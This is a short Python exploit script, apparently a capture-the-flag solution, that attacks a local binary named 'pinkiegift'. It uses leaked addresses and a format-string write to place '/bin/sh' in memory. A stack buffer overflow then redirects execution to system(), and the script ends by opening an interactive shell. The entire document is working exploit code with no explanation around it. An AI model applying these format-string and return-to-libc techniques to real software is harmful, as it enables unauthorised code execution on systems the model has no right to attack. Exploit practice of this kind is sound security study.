import sys
from pwn import *
from libformatstr import FormatStr

p = process('./pinkiegift')
gift   = p.recv().split(' ')
binsh  = int(gift[6], 16)
system = int(gift[7], 16)

print "Stage 1: Change value of 'binsh' variable into '/bin/sh'"
fmt = FormatStr()
fmt[binsh] = "/bin/sh"
print fmt[binsh]
print fmt.payload(1, 0)
p.sendline(fmt.payload(1, 0))
stage1 = p.recv()

print "Stage 2: 'Exploit' gets to run 'system(binsh)'"
stage2  = "A"*136
stage2 += p32(system)
stage2 += "PADD"
stage2 += p32(binsh)

p.sendline(stage2)
p.recv()

p.interactive()
